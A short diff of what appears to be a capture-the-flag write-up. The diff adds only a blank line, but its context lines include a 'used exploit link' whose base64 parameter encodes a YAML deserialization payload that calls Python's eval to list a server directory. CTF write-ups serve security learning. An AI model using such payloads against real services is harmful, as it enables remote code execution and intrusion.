@@ -15,6 +15,7 @@ From the output of the previous command we can see there is an app directory, ba
 And there we go we got the flag.
 
 Used exploit link:http://172.105.121.246:5990/eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OmV2YWwgWyJfX2ltcG9ydF9fKCdvcycpLmxpc3RkaXIoJy9hcHAnKSJd
+
 ![image](https://github.com/user-attachments/assets/41838016-c954-43cd-b3cb-16e6c7bd44a9)
 
 
